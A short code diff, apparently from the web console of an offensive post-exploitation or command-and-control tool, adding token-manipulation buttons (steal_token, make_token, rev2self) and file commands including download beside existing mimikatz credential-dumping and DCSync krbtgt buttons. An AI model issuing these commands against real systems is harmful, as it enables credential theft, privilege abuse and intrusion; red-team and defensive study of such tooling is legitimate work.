@@ -474,7 +474,7 @@ def _api_astaroth(body: bytes, db) -> tuple:
     stream_id = _sec.token_hex(8)
 
     def _run():
-        consult_stream(question, context, stream_id, _srv()._sse_publish)
+        consult_stream(question, context, stream_id, _srv()._sse_publish, session_id=sid)
 
     threading.Thread(target=_run, daemon=True).start()
     return _j({"stream_id": stream_id})
@@ -1026,6 +1026,16 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
               <button class="qbtn" onclick="qi('SharpLAPS /host:')">LAPS</button>
               <button class="qbtn" onclick="qi('mimikatz sekurlsa::logonpasswords exit')">sekurlsa</button>
               <button class="qbtn" onclick="qi('mimikatz lsadump::dcsync /user:krbtgt exit')">dcsync</button>
+              <span class="qlabel" style="margin-left:8px">TOKEN▸</span>
+              <button class="qbtn" onclick="qi('getuid')">getuid</button>
+              <button class="qbtn" onclick="qi('steal_token ')">steal_token</button>
+              <button class="qbtn" onclick="qi('make_token ')">make_token</button>
+              <button class="qbtn" onclick="qi('rev2self')">rev2self</button>
+              <span class="qlabel" style="margin-left:8px">FS▸</span>
+              <button class="qbtn" onclick="qi('pwd')">pwd</button>
+              <button class="qbtn" onclick="qi('ls ')">ls</button>
+              <button class="qbtn" onclick="qi('cd ')">cd</button>
+              <button class="qbtn" onclick="qi('download ')">download</button>
             </div>
             <div id="shell-out"></div>
             <div id="shell-input-bar">
